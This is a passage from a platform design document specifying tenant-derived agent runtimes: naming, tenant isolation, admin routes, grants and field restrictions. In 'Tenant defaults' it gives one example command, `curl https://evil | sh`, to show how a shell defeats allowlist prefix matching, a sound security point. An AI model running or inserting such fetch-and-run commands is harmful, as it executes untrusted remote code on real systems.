"Reading" states why that alone is not enough. Every name stays globally unique, so session rows, pod labels, CRDs, and metrics keep one string. |

### Stored format

`tenant_runtime_definitions` holds the columns of `runtime_definitions` plus `tenant_id`, with `(tenant_id, name)` as primary key and a unique index on `name`. It takes `lenny_tenant_guard` and `lenny_tenant_isolation`, as migration `0054` did for delegation policies, so §4.2's statement that a missing WHERE clause cannot break isolation holds. Reads go through `pgtenant.InTx` with the tenant, and platform reads go through `pgtenant.InAllTenants`. §4.2's classification table gains a tenant-scoped row, and the platform-global row stays for platform records. §12.8 erasure gains this table, the grant, and owned pools. See "Tenant suspension and deletion".

### Names

The platform assigns each granted tenant a `namePrefix`, unique across tenants and immutable once the tenant has a row. A tenant-derived runtime is named `<namePrefix>--<suffix>`, such as `acme--chat-payments`.

- A prefix matches `^[a-z0-9]+(-[a-z0-9]+)*$`, so it holds no `--` and does not end in `-`. A name therefore has one prefix, read up to its first `--`. Without this, `a--b--x` fits the prefixes `a` and `a--b`.
- `consumed_name_prefixes` records each prefix when first assigned, and neither withdrawal nor erasure removes it, so a later tenant cannot take a name that retained records still carry.
- `--` becomes reserved. The admin API, the bootstrap seed, and the RuntimeReconciler refuse a platform runtime or pool name containing it. Nothing is deployed, so nothing migrates.
- A tenant's write naming another prefix is refused with `422 INVALID_DERIVED_RUNTIME`, so `RESOURCE_ALREADY_EXISTS` can only report the tenant's own name and is no oracle.
- The whole name is at most 63 characters, because `createPod` copies it to the `lenny.dev/runtime` pod label (DF-10).
- A deleted name stays consumed, as [`egress-and-git-design.md`](egress-and-git-design.md) states for pools, and only the tenant's own names are consumed. Creates are rate-limited, and soft-deleted rows count toward a separate bound.

### Reading

`runtimestore` gains a tenant view, `Resolve(ctx, tenantID, name)` and `List(ctx, tenantID)`. A name containing `--` reads only the tenant table, in that tenant's context. Any other name reads the platform table and requires a `runtime_tenant_access` row. `List` returns the platform rows the tenant holds access rows on, plus the tenant's own rows. It also evaluates the grant entry on each resolve (see "Base changes"). This is also what closes DF-2.

Row-level security stops a leak and does not stop a wrong answer. A tenant-derived name read through the platform runtime store returns `ErrNotFound`, and many sites continue on that answer: `runtimeSetupPolicy` in `bind_request.go` keeps `shell` true, which loses `setupCommandPolicy.shell: false`; `enforceSetupCommandPolicy` and §14.1 **Runtime workspace defaults.** rule 4, under which a session whose runtime has no registry entry binds its plan without defaults, bind the plan unchecked with no defaults; `requireExplicitEnvironmentAdmission` leaves the name to later checks; and the limits, idle, content-policy, and manifest reads in `envelope.go`, `sessionage`, `sessionidle`, `delegation/service.go`, and `mcptools_register.go` fall back to defaults. These rules follow.

- `Server`, `mcptools.Deps`, the delegation service, the session resolvers, and `credentialsurface.go` in `cmd/lenny-gateway` hold the tenant-view interface and no plain `Store`, so a missed site does not compile. `runtimecapoverride.ResolveForTenant` takes the view as well.
- `Store.Get` on a name containing `--` returns `ErrTenantScopedName`, distinct from `ErrNotFound`, and no path continues on it.
- A tenant-view miss on the final row refuses the request, on any name, at create, derive, and a delegated child's placement. The check runs at the post-chain point of [RT-2](runtime-routing-design.md#post-chain-point), after the `PreRoute` chain, the §4.8 gateway interceptor phase that runs before runtime selection, so a runtime route or an interceptor that moves a session meets it. `ResolvePool` reads no runtime store, so without this a revoked access row still lands sessions. The answer is `RESOURCE_NOT_FOUND`, or the surface's own not-found answer, for an absent name and for another tenant's name. §14.1 rule 4, which binds a plan without defaults for a runtime with no registry entry, does not apply where the tenant view is wired. On a create this check runs first, because `requireAdmissionRateLimit` calls `ResolvePool` before any runtime read.

**Registered rows.** At the same post-chain point, for every create, derive, and delegated child, the gateway refuses a session whose final runtime row is not `registered`, and for a platform-derived runtime it also requires the base's row to be `registered`, because the pods are built from the base's `Runtime` resource. The answer is the one for an unknown runtime: `RESOURCE_NOT_FOUND`, or the surface's own not-found answer, which is `TARGET_NOT_IN_SCOPE` for a delegated child. The owner settled this check on 2026-11-13 as AR O8 (b), "yes to all the others", and it replaces session derive's SD-P4 and its `target_unsupervised` reason and this design's former export refusal on an unsupervised target ([`agent-runtimes-only-design.md`, "Decisions"](agent-runtimes-only-design.md#decisions)). The reason is the stale row, which every path can reach: the RuntimeReconciler's `mirror` refuses a `Runtime` resource whose `Registered` condition is false and leaves the row as it was, so the row would otherwise describe a resource the controller no longer accepts. The RuntimeReconciler records the condition in `registered` on the row, and the admin API writes `true` on a row it registers with no `Runtime` resource. The check reads the live row and no revision, because `registered` is no field of the `Runtime` resource that a revision copies. A tenant-derived runtime meets the same fact through its base: a base at `Registered=False` reads as `incompatible` under "Base changes", and new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`. A resume reads the session's stored runtime and is not refused here, so a running session survives a later refusal of its resource.

`GET /v1/runtimes/{name}/meta/{key}` has no principal, so a `--` name always answers not found there.

`Router` holds the tenant view too, and its plain `Store` moves to a field that only `requireAdmin` routes use. A handler only `platform-admin` reaches reads a view seeing both tables, through `pgtenant.InAllTenants`, wherever it reads a pool's runtime. Without that, `validatePoolUpdate` answers `400` for an owned pool on every `PUT` and on `warm-count`, which delegates to it, and `runtimeRestartable` reads false.

A handler a `tenant-admin` reaches reads the tenant view for one tenant and never the all-tenants view. These are `delegationPolicyRuntimeDependents`, `handleEnvironmentRuntimeExposure`, `environmentDryRunPreview`, route admission under [RT-4](runtime-routing-design.md#rt-4-runtime-routes), and the capability override `PUT`, which otherwise answers `404` for the tenant's own derived runtime. Two of them need more than a type change:

- The policy guard takes the policy's tenant. Migration `0054` keys policies on `(tenant_id, name)`, so names collide across tenants. Read across tenants, a `globex` admin deleting `strict` would get `409` naming `acme--chat-payments`, and `acme` would block that delete (DF-13).
- Route admission reads each target through the tenant view, and a miss refuses the write, so a route cannot name another tenant's derived runtime.

### API

| Route | Caller | Behaviour |
| :-- | :-- | :-- |
| `PUT /v1/admin/tenants/{id}/derivation-grant` | `platform-admin` | Creates or replaces the grant. Mirrored to the tenant's chain under [SO-4a](security-oversight-design.md#so-4a-mirror-to-the-tenant-chain). |
| `GET /v1/admin/tenants/{id}/derivation-grant` | `platform-admin`, and `tenant-admin` for its own | Returns the grant and current use. |
| `POST /v1/admin/derived-runtimes` | `manage_derived_runtimes` | Creates the runtime and its owned pool in one transaction. |
| `GET /v1/admin/derived-runtimes[/{name}]` | The same permission, `tenant-viewer`, and `platform-admin` with `?tenant_id=` | Returns the declared fields, the effective runtime, `ownerTenantId`, `baseStatus`, and `poolStatus`, the owned pool's state. |
| `PUT /v1/admin/derived-runtimes/{name}` | `manage_derived_runtimes` | Requires `If-Match`, and takes the same body. `name` and `baseRuntime` are immutable. |
| `POST /v1/admin/derived-runtimes/{name}/drain` | `manage_derived_runtimes` | Drains the owned pool, so its new sessions stop. |
| `POST /v1/admin/derived-runtimes/{name}/artifacts` | `manage_derived_runtimes` | Takes the bytes of one `artifact` asset under `maxAssetEntryBytes` and the grant's `maxAssetUploadBytes`, chunks them into the packs of the named runtime's tenant-owned assets set under the tenant's key, which are the upload's only stored copy, and answers with the content digest and size, which a later write's `artifact` entry on the same runtime names. Refused while `runtimes.tenantDerivation.allowAssets` or the grant entry's `allowAssets` is false. See "Tenant shared assets" under DR-9. |
| `DELETE /v1/admin/derived-runtimes/{name}` | `manage_derived_runtimes` | Checks dependents first. It answers `409 RESOURCE_HAS_DEPENDENTS` and changes nothing while non-terminal sessions remain, as §15.1's deletion rule states, and otherwise removes the runtime and pool. |

New routes keep `requireAdmin` on `POST /v1/admin/runtimes` untouched and give the request its own schema. The body decodes with unknown fields refused, because the existing handlers silently drop them, and a refused field must not read as accepted. `runtimeRef` and `AuthorizedRuntime` do not change on the wire. `manage_derived_runtimes` is a new named permission that `tenant-admin` holds, and a custom role can hold it under §10.2's ceiling. An environment `admin` does not hold it, in line with [`tenant-scoping-identity-design.md` decision 7](tenant-scoping-identity-design.md#decisions).

New error codes are `403 DERIVATION_NOT_GRANTED`, `422 DERIVATION_BUDGET_EXCEEDED`, `422 TENANT_ASSETS_REQUIRE_OWNED_POOL`, which is an internal guard that no request reaches while every tenant-derived runtime has one owned pool ("Tenant shared assets" under DR-9), and `409 DERIVED_RUNTIME_UNAVAILABLE`, whose `details.reason` names the base state below. Field refusals reuse `INVALID_DERIVED_RUNTIME` with `details.field`. Writes use [EG-9](egress-and-git-design.md#proposal-split)'s write path, which applies `GUARDRAIL_VIOLATION`.

### Stored formats and wire contracts this forces

| Item | Change | Proposal |
| :-- | :-- | :-- |
| `tenant_runtime_definitions` | New table, with [EG-9](egress-and-git-design.md#proposal-split)'s nullable `suspended_by` | DR-4 |
| `tenant_derivation_grants` | New table, with one row per tenant, readable under the tenant's context, and written only under `lenny.admin_mode`, a transaction setting the gateway sets only on `platform-admin` paths, using the trigger migration `0052` introduced | DR-4 |
| `consumed_name_prefixes` | New table, holding the prefix string alone, written at first assignment, and surviving withdrawal and erasure | DR-4 |
| `runtime_definitions` | `retire_at`, in DR-6, and `registered`, which the RuntimeReconciler mirrors, in DR-4 | DR-4 and DR-6 |
| `pools` | `owner_tenant_id` and `template_pool`, which [EG-9](egress-and-git-design.md#proposal-split) carries as a hook under the egress design's "Reserved for other designs", `pod_runtime_ref` from DR-2, which EG-9 also reserves, `warm_stop_reasons` from DR-5, and `reserved_pods` from DR-10. The pool's `placement` block, whose `reservedOverlay` replaces `reserved_placement`, is the placement design's ([PM-3](placement-design.md#pools-reference-one-offering)) | EG-9, DR-2, DR-5, DR-10 |
| `PodSet.spec` | `podRuntimeRef` and the owner, because the controller stamps the owner from it, and `reservedPods`, which the PoolScalingController renders from the pool row. The reserved overlay reaches the `PodSet` as the placement design renders it ([PM-5](placement-design.md#pm-5-rendering)) | DR-2, DR-5, DR-10 |
| `AgentPod.spec` | `reserved`, set at creation | DR-10 |
| `workspaceDefaults` | `gitClones`, with `write` and no `warm` field, on operator runtimes and tenant-derived runtimes | DR-9 |
| `gitClone` and `inlineFile` sources | `runtimeDefault`, gateway-written and refused from a client, in the stored plan, `schemas/workspaceplan-v1.json` under `additionalProperties: false`, `WorkspaceSource` in `lenny-adapter.proto`, and the mapping in `podsession/workspaceplan.go`, which would otherwise drop them silently | DR-9 |
| `WorkspacePlan` | `writeDefaultClones` from a client, and `readOnlyDefaultClones`, gateway-written, through the same carriers | DR-9 |
| `WorkspacePlan` setup commands | `cwd`, which a client can set and the gateway writes as a concrete path on every command at composition, through the same carriers, and which a derive copies | DR-12 |
| Session row and setup commands | `derivedFrom`, `snapshotIsOwn`, `planOriginRuntimes`, and a command's `origin`, under [`session-derive-design.md`](session-derive-design.md) | [SD-1](session-derive-design.md#sd-1-one-route) |
| Session row | `covered_stores` and `withheld_stores`, written at each claim, which the gateway reads at every checkpoint, export, and resume to compute the eligible platform chunk sources | DR-11 |
| `runtime_definitions.registered` | Read at the post-chain point for every create, derive, and delegated child, and written `true` by the admin API on a row with no `Runtime` resource | DR-4 |
| `content_stop_epochs` | Tenant-keyed counters outside the grant and the security record, under [`session-derive-design.md`, "Stops"](session-derive-design.md#stops) | DR-4 and DR-7 |
| Derived runtime `sharedAssets` | `inline` and `artifact` entries, an `artifact` carrying the content digest its upload returned, and `gitRepository` assets, each with `name`, `url`, `ref`, and optional `prestage` | DR-11 |
| Runtime `sharedAssets` `gitRepository` entry | `prestage: true` in place of the optional `path` of the egress design's former decision 63, on operator entries and tenant entries | DR-11 |
| Tenant artifacts | Bytes a tenant uploads for an `artifact` asset of one derived runtime, stored only as packs of that runtime's tenant-owned assets set under the tenant's key, addressed by content digest within the runtime, counted against `maxAssetUploadBytes`, and deleted when unreferenced for 7 days, with the runtime, or with the tenant; data class Confidential | DR-11 |
| `FinalizeWorkspace` and `Resume` | The URLs a restore completion may fetch, and the store directories to withhold | DR-11 |
| Claim request | `coveredStores` and `withheldStores` | DR-11 |
| Session response and session row | `withheldWarmEntries`, each with the entry's `name` and a reason, and no URL | DR-11 |
| Pool row, `PodSet.spec`, and `AgentPod` | On the owned pool row, `warm_clone_bytes` and `one_session_per_pod`. On any pool row, `warmCloneBytes` and `warmCloneMaxAgeSeconds`. `warmClones`, each entry carrying `url`, `ref`, the store directory, `declarer`, and `prestage`, and `warmCloneBytes`, on every `PodSet`. `warmStores`, `fillFailure` with the store directory and its declarer, `withheldStores`, and the `lenny.dev/owner-tenant` label on the `AgentPod` | DR-5, DR-9, and DR-11 |
| Chart | The `lenny-reserved` `PriorityClass`, and the `ResourceQuota` split into reserved, general, and storage quotas | DR-10 |
| Base-change outbox | A row written in the platform write's transaction | DR-6 |
| Pod label | `lenny.dev/served`, under the label webhook `lenny-label-immutability` | [EG-9](egress-and-git-design.md#proposal-split), with its readers in DR-5 |
| Name grammar | `--` reserved | DR-1 |
| §15.1 | The routes and codes above | DR-4, DR-6 |

## Who turns it on

The capability needs a grant per tenant, in the form of [EG-9](egress-and-git-design.md#proposal-split)'s per-class gates, with parameters. The class is `tenantDerivedRuntimes`, and a tenant with no grant answers `403 DERIVATION_NOT_GRANTED`. A Helm value, `runtimes.tenantDerivation.enabled`, is false by default. While false it refuses a new grant, any write that raises a limit or adds a base, flag, or overlay, and `POST /v1/admin/derived-runtimes`. A withdrawal or a narrowing still passes, and existing runtimes keep resolving, so turning it off stops new use and is not an emergency stop.

```yaml
# PUT /v1/admin/tenants/{id}/derivation-grant
namePrefix: acme
maxRuntimes: 10
maxOwnedPods: 20
maxAssetUploadBytes: 1073741824
bases:
  - baseRuntime: chat
    templatePool: chat-shared
    resourceClasses: [small, medium]
    allowWorkspaceFiles: false
    allowSetupCommands: false
    allowGitClones: false
    allowGitCloneWrites: false
    allowAssets: false
    maxWarmCloneBytes: 0
    maxDefaultGitClones: 8
    maxPrestageTimeoutSeconds: 900
    maxReservedPods: {}
    ownedOverlays: []
```

A base entry is accepted only when all of these hold. A condition on a field that [`runtime-revisions-design.md`](runtime-revisions-design.md) versions, such as `requireSoPeercred`, holds for every revision in the base's traffic, because any of them can serve the next session ([RV-5](runtime-revisions-design.md#rv-5-derived-runtimes)). A new base revision that breaks one is evaluated as "Base changes" states.

- The base is a standalone runtime.
- The tenant holds `runtime_tenant_access` on it.
- `templatePool` is a platform pool backed by the base, and the tenant holds `pool_tenant_access` on it.
- `resourceClasses` lies within the base's `allowedResourceClasses`.
- The base has `requireSoPeercred` true, which keeps the `SO_PEERCRED` check on the boundary between the adapter and the agent. A base with `false` runs in nonce-only mode, which a pool admits only with `acknowledgeNonceOnlyAuth`, a deployer's statement that a tenant does not make.
- The base's `Runtime` resource exists, which the gateway's `get` permission reads, because a pool's pods need it (DF-3).
- With `allowSetupCommands` set, the base's `setupCommandPolicy` has mode `allowlist` and `shell: false`.
- With `allowGitCloneWrites` set, `allowGitClones` is set.
- With `maxWarmCloneBytes` above zero, the value is at or below `runtimes.tenantDerivation.warmClones.maxBytesPerPod` and the template's fetch size cap, the bytes one git fetch may transfer. A base carries public `gitRepository` entries alone (decision 32), so a grant entry no longer depends on what the base's entries hold.
- `maxDefaultGitClones`, when set, is at least 0 and at most `runtimes.tenantDerivation.maxDefaultGitClonesCeiling`, 32 by default. An entry that omits it reads `runtimes.tenantDerivation.maxDefaultGitClones`, 8 by default. The value is the operator's cap for that tenant on each runtime derived from the base, as "Checks at write" under DR-9 states (decision 43).
- `maxPrestageTimeoutSeconds`, when set, is positive. An entry that omits it reads `adapter.prestageTimeoutSeconds`, 900 seconds by default. It bounds the `prestageTimeoutSeconds` of each runtime derived from the base, as "Fields" states (decision 43).

The grant's `maxAssetUploadBytes` limits the bytes of the tenant's stored artifact uploads across all its derived runtimes, as "Uploads" under "Tenant shared assets" states (decision 43). A grant that omits it reads `runtimes.tenantDerivation.maxAssetUploadBytes`, 1 GiB by default. No deployment ceiling bounds the grant's value, which the owner settled as decision 44.

A base outside the list cannot be derived from, and "Base changes" states what each grant change does. A grant or a withdrawal is a platform admin's write to a customer's configuration, so [SO-4a](security-oversight-design.md#so-4a-mirror-to-the-tenant-chain) mirrors it, as for the other gates.

## Fields

§5.1 **Derived Runtime** defines what each field does, and this table states only what a tenant may set and why. Some reasons depend on what a field does: `llmFormats` names the LLM API formats the runtime speaks to Lenny's LLM proxy, which replaces `supportedProviders` and `credentialCapabilities` under [`llm-upstreams-and-cost-budgets-design.md`](llm-upstreams-and-cost-budgets-design.md), `agentInterface` is the description discovery shows other agents and the A2A adapter builds its agent cards from, `publishedMetadata` holds documents the gateway publishes for the runtime at a visibility of `public`, `internal`, or `tenant`, and `sharedAssets` lists files the adapter places on warm pods before any session, read-only at `/lenny/assets`, and the repositories whose stores `lenny-store-fill` fills on the pod's store volume, which every slot reads at `/lenny/git-stores`. Each row follows §5.1 **Normative Merge Algorithm**. Rows marked "not in §5.1" appear in `Merge` or the payload and are absent from the table (DF-12). "Narrow" means the value is checked against the base at write and evaluated against the live base at resolve, as "Base changes" states.

| Field | Merge rule | Tenant | Rule and reason |
| :-- | :-- | :-- | :-- |
| `name`, `baseRuntime` | Own, reference | At create | Under "Names" and the grant. Single-level, as `validateDerivedRuntime` requires. |
| `image`, `isolationProfile`, `allowedResourceClasses`, `capabilities.*`, `requireSoPeercred`, `command`, `env` | Prohibited or inherited | Refused | They describe the image and its security posture. `type` and `executionMode` no longer exist, and a body naming either answers `400 VALIDATION_ERROR` naming the field, as [`agent-runtimes-only-design.md`](agent-runtimes-only-design.md#ar-4-admission-of-removed-fields) states for every runtime write. |
| `archivePolicy`, `minPlatformVersion` | Not in §5.1 | Refused | `archivePolicy` opts in to symbolic links. `minPlatformVersion` has no use for a tenant. |
| `description` | Not in §5.1 | Yes | It reaches only the owner. |
| `llmFormats` | Override, restrict | Narrow | A subset of the base's, because the list describes the binary. |
| `limits` | Override | Narrow per field | A larger `maxSessionAge` or `maxUploadSize` holds platform capacity past the value the platform set. |
| `setupCommandPolicy` | Override, restrict | Narrow | An allowlist is a subset. `blocklist` to `allowlist` is accepted and the reverse is refused. `shell: true` over `false` is refused. `maxCommands` is at most the base's. Effective policy applies both, closing DF-7. |
| `setupPolicy.timeoutSeconds` | Maximum | Yes, positive | It is bounded by `gateway.maxFinalizingTimeoutSeconds`, as `validateSetupPolicy` does. A longer setup holds only the tenant's pod. Zero means no cap and is refused. |
| `setupPolicy.onTimeout` | Override | Yes | It affects only the owner's sessions. |
| `workspaceDefaults.files` | Append | Under `allowWorkspaceFiles`, after DR-3 | See "Tenant defaults". Replacing a base file's path is refused. Each is a §14 `inlineFile` under a Helm size bound, visible in `GET /v1/sessions/{id}`, so it holds no secrets. The adapter passes each to `lenny-materialize` as an `inlineFile` source inside the helper plan. |
| `workspaceDefaults.setupCommands` | Append | Under `allowSetupCommands`, after DR-3 | See "Tenant defaults". |
| `workspaceDefaults.gitClones` | Append, new in §5.1 | Under `allowGitClones`, after DR-3 | See "DR-9: Default git clones". |
| `runtimeOptionsSchema` | Separate validation, in place of §5.1's override | Yes | A session's options are validated at the post-chain point against the chosen base revision's schema and against the tenant's schema, compiled as separate resources, and both must accept them ([`runtime-revisions-design.md`, "RV-7 Session options"](runtime-revisions-design.md#rv-7-session-options)). A tenant schema can therefore only add constraints, and §5.1's rule that it names only the base's properties is dropped. The write compiles the schema and refuses one that does not compile, refuses `$schema`, `$id`, and any `$ref` other than a local `#/...` reference, because no component fetches a schema and each of those can name another document, and bounds its size. A tenant schema that lists in `required` a property some revision in the base's traffic forbids reads as `incompatible`, as "Base changes" states. |
| `defaultPoolConfig` | Override | Refused | The `pool` block replaces it. |
| `delegationPolicyRef` | Override, restrict | Yes | It names a policy in the tenant. Effective policy is the intersection §8.3 **Effective policy** states, which needs `Merge` to keep both references (DF-7). A base's reference resolves in the session's tenant today, so a `tenant-admin`, who writes those policies, already controls its content. |
| `allowSelfRecursion` | Restrict-only | `false` only | Unchanged from §5.1. |
| `agentInterface` | Override | Yes | The tenant's value merges over the selected base revision's `agentInterface`, and discovery publishes the merged value per caller, under decision D12 of [`runtime-revisions-design.md`](runtime-revisions-design.md#discovery). Lenny generates no agent card: under [`rest-only-client-api-design.md`](rest-only-client-api-design.md), the A2A adapter builds the card from the published value, and `pkg/gateway/runtime/agentcard` leaves. The card the gateway generates carries `VisibilityPublic` today. A tenant-derived runtime carries no `public` metadata entry (decision 11), so the public runtime index of R8 never lists it, and the A2A adapter can build its card only for a caller whose bearer may use the runtime. Other agents in the tenant read this text through discovery, so it is a prompt injection channel inside the tenant. |
| `publishedMetadata` | Append | `tenant` visibility only | `public` is served unauthenticated on the operator's origin with a writer-chosen content type. `internal` reaches any authenticated caller in any tenant (§5.1 **`publishedMetadata` Field**). |
| `oneSessionPerPod` | New | See below | Applied to the owned pool. |
| `sessionPolicy` | Limits alone | See below | Applied to the owned pool. |
| `capabilityInferenceMode`, `toolCapabilityOverrides` | Removed | Refused | Both left with the gateway's capability inference for MCP tools under D10 of [`connector-removal-design.md`](connector-removal-design.md), whose readers were the tools of `type: mcp` runtimes and of connectors, and a body naming either answers `400 VALIDATION_ERROR` naming the field, under D27 of [`runtime-revisions-design.md`](runtime-revisions-design.md#decisions). |
| `labels` | Merge | Yes | Keys under `lenny.dev/` are refused. See "Environments". |
| `checkpointPolicy` | Restrict-only | Stricter only | A tenant may set only a value stricter than the base's, in the order `full`, `sealOnly`, and `none`, as [`incremental-checkpoint-design.md`, "IC-8: Checkpoint policy, interval, and change tracker"](incremental-checkpoint-design.md#ic-8-checkpoint-policy-interval-and-change-tracker) states. The field is live, so the check reads the base's current value at write and at resolve. |
| `periodicCheckpointIntervalSeconds` | Restrict-only | Longer only | A tenant may set an interval no shorter than the base's interval, which is the interval that [`incremental-checkpoint-design.md`, "Interval"](incremental-checkpoint-design.md#interval) gives a session on the owned pool with no tenant value: the pool's value, otherwise the base Runtime's value, otherwise the gateway default. A write below it answers `422 INVALID_DERIVED_RUNTIME` with `details.field`, and a longer interval is accepted, because a shorter one raises the object storage and gateway load the operator or the runtime author chose for the base. The field is live under [RV-1](runtime-revisions-design.md#rv-1-revisions), so the check reads the base's current value at write and at resolve, and a session's interval is the longer of the tenant's value and the base's. A later base change that raises the base's interval above the tenant's applies at the next resolve, as "Base changes" states. |
| `checkpointExcludes` | Append | Yes | The tenant's entries are appended to the list of the base revision a session runs, as that design states. The field is versioned on the base, so the merge reads the selected base revision ([RV-5](runtime-revisions-design.md#rv-5-derived-runtimes)). |
| `maxWorkspaceSealDurationSeconds` | Override, new in §5.1 | Yes, within the ceiling | The seal window of the tenant's sessions, within which the seal at session end retries and the session's file exports still running finish, under decision A19 of [`message-delivery-design.md`](message-delivery-design.md#decisions). The runtime's value overrides the pool's. A tenant may set a value greater than `delegation.usageQuiescenceTimeoutSeconds`, as §8.3 **Return on completion** requires of the window, and at most the platform ceiling `gateway.workspaceSealMaxDurationCeilingSeconds`, a chart value of 600 seconds by default, and a write outside that range answers `422 INVALID_DERIVED_RUNTIME` with `details.field`. A longer window holds only the tenant's own pod and session, and the ceiling is the term the deployment's terminal pipeline bound and the claim orphan timeout count, so no tenant value lengthens the platform's bound. The field is versioned and gateway-read under [RV-1](runtime-revisions-design.md#rv-1-revisions), so the tenant's value replaces the selected base revision's ([RV-5](runtime-revisions-design.md#rv-5-derived-runtimes)). |
| `sharedAssets` | Append, with no replacement | `inline` and `artifact` under `runtimes.tenantDerivation.allowAssets` and the grant's `allowAssets`, and `gitRepository` under `allowGitClones` and a `maxWarmCloneBytes` above zero, each after DR-3, on the owned pool alone | See "Tenant shared assets" under DR-9. The entries render only on the owned pool's pod sets, whose pods serve the owner alone, and a write that would place them on any other pool answers `422 TENANT_ASSETS_REQUIRE_OWNED_POOL`, an internal guard. A `gitRepository` asset is the tenant's only way to warm a repository. A tenant's `PUT` keeps every `gitRepository` asset that a `platform-admin` wrote, which is `platform`-declared, and accepts one that its body carries unchanged. |
| `prestageTimeoutSeconds` | Override, new in §5.1 | Yes, within the grant entry's bound | The time a warm-up checkout run on a slot of the owned pool may take before it skips the entries it has not staged, as [WM-15](workspace-materialization-design.md#wm-15-warm-up-checkout-and-reflink-rebuild) states. The tenant chooses which repositories its owned pool stages, and a large one can need longer than the chart's value, so the owner gave the tenant this setting per runtime (decision 43). A tenant's value is positive and at most the grant entry's `maxPrestageTimeoutSeconds`, which reads `adapter.prestageTimeoutSeconds`, 900 seconds by default, when the entry omits it, and a write outside that range answers `422 INVALID_DERIVED_RUNTIME` with `details.field`. A longer run holds only the tenant's own pods: at warm-up the pod reports ready later, and after a slot release a bind cancels the run. The pod controller renders the effective value onto the adapter, so the field is versioned and pod-affecting under [RV-1](runtime-revisions-design.md#rv-1-revisions), and the tenant's value replaces the selected base revision's and enters the pod-set key ([RV-5](runtime-revisions-design.md#rv-5-derived-runtimes)). With no value on the runtime or its base revision, the owned pool's value applies, which the template supplies, and otherwise the chart's. |

### `oneSessionPerPod` and `sessionPolicy`

Concurrency and recycling come from the template pool. A tenant has one choice over them, `oneSessionPerPod`, which the owner accepted in the words "makes sense, yes". An owned pool serves a runtime's sessions under one of two policies:

| `oneSessionPerPod` | Owned pool's `maxConcurrentSessionsPerPod` and recycling |
| :-- | :-- |
| `false`, the default | The template's, copied with its acknowledgments, `cleanupCommands`, and `cleanupTimeoutSeconds` under "Template copy". An owned pool has one tenant, and the tenant pin keeps every pod on it. |
| `true` | `maxConcurrentSessionsPerPod: 1` and no `recycle` block, on any template. The row carries no acknowledgment and no cleanup commands, because these values need no acknowledgment and no pool recycle scrub runs. |

Every acknowledgment is a deployer's statement and a tenant writes none, so a tenant can only move to the narrower policy. Three cases need it: an environment with its own policy on a concurrent base, a default clone with a `write` other than `none`, and a clone under a VCS pool with `userAuthorization: required`. A shared pod refuses each of them. It also serves a tenant whose security team does not want to rely on a best-effort pool recycle scrub between its users. A tenant wanting a template's one-session policy to hold after a template write sets the field, because a template widening otherwise reaches the owned pool.

The field is one-way. A `PUT` that omits it leaves it unchanged, and a `PUT` setting `false` on a row holding `true` answers `422 INVALID_DERIVED_RUNTIME`. The reason is the one under "One session per pod" in DR-9: a pod created for one session can hold a repository, a deny, or an egress or git route belonging to one environment, and the claim paths read the pool's current policy with no check on the pod. A tenant that needs the template's policy again creates a new runtime. When the field becomes `true`, bound sessions complete in place, served pods are refused and drain, and reserved holds end.

A tenant cannot set a value between 1 and the template's. Such a pod still applies no per-session policy, so it adds no isolation, and a platform admin can name another template. A `sessionPolicy` naming `maxConcurrentSessionsPerPod`, any acknowledgment, or any `recycle` field answers `422 INVALID_DERIVED_RUNTIME` with `details.field`. Raising concurrency stays refused for the reasons decision 3 records, restated under session isolation: concurrent slots have their own containers, UIDs, and `/tmp`, and still share the pod's network and IPC namespaces, its sandbox kernel under gVisor and Kata, its adapter and `netagent`, pod-wide eviction, and its CPU and memory ([SI-10](session-isolation-design.md#si-10-what-stays-shared)), the template's `acknowledgeSharedPod` was made for the template's value, a runtime is not known to tolerate more, and where `netagent` cannot attribute a connection to its slot a raised value moves more users onto E = ∅ pods. On an owned pool that recycles under its template, reuse holds only within the reserved hold, because `warmCount` sets `minWarm` and `maxWarm` equal, which makes §5.2's pinned idle bound zero.

`sessionPolicy` on a tenant-derived runtime holds the limits below, each checked against the template pool, whose row is what the gateway enforces. The owned row holds the lower of the template's value and the tenant's, with a zero first resolved to its platform default, and a template write recomputes it. A platform-derived runtime keeps the whole of §5.1's `sessionPolicy`.

| Field | Tenant | Rule |
| :-- | :-- | :-- |
| `cleanupCommands`, `cleanupTimeoutSeconds` | Refused | The slot release runs them through the slot's supervisor between two sessions ([SI-3](session-isolation-design.md#si-3-runtime-processes-slot-release-and-setup-commands)), so a tenant-written cleanup command would be code that runs after one user's session and before the next user's. `oneSessionPerPod: true` needs none. Adding them later is additive. |
| `maxSessionAgeSeconds`, `maxClientIdleSeconds`, `slotRetries` | Lower only | They bound how long the tenant holds capacity. |
| `onPoolExhausted`, `maxQueueWaitSeconds` | `reject`, or `queue` within the template's wait | The queue is gateway memory. |

### Tenant defaults

The owner wants default files, setup commands, and git clones. Any of them is code execution at the slot UID. A file reaches an exempt base command: with a base command `pip install -r requirements.txt`, a tenant-written `requirements.txt` selects what gets installed, whatever `allowSetupCommands` says. A runtime also loads hook and configuration files from the workspace. No command control bounds a file, so a file has its own grant flag. DR-9 states the same for a clone, and "Tenant shared assets" under DR-9 states it for an `inline` or `artifact` asset under `/lenny/assets`, which a runtime or a base command can load, and for a `gitRepository` asset, whose staged tree a session adopts as its checkout.

Each kind needs its grant flag and DR-3 landed: `allowWorkspaceFiles` for default files, `allowSetupCommands` for default commands, `allowGitClones` for default clones and `tenant`-declared `gitRepository` assets, and `allowAssets` for `inline` and `artifact` assets. Every slot container of every agent pod runs the runtime supervisor ([PL-1](agent-pod-layout-design.md#pl-1-pod-blueprint)), so every base qualifies once DR-3 has landed. Without DR-3 the base's command runs at the adapter's UID in the adapter's container, which holds the projected service account token and a writable credential volume (DF-4). No flag is needed for R2.

Today's command exemption exists because an operator wrote `workspaceDefaults`. A tenant-written command gets no exemption. It counts toward `maxCommands` and is checked against the effective `setupCommandPolicy` at write and again when the plan binds, so a narrowed base policy takes effect. The effective policy must be `allowlist` with `shell: false`, because matching is a prefix on raw text: under a shell, `pip install x; curl https://evil | sh` matches `pip install`. A `blocklist` is not a security boundary, as §7.5 states, and a base with no policy checks nothing. Under `shell: false` an allowlist bounds the program and its arguments, and an allowed program can still run what it fetches. Base commands run first and cannot be removed, as the merge rule states.

### Compared with a session plan

| A client's plan today | A tenant-derived runtime | Difference |
| :-- | :-- | :-- |
| Inline files and uploads | Default files | A client's file runs in that client's session. A default runs in every session on the runtime with no user choice, so it reaches other users' credentials. |
| Setup commands under the runtime's `setupCommandPolicy` | Default commands under the same policy, with `shell: false` | As above. |
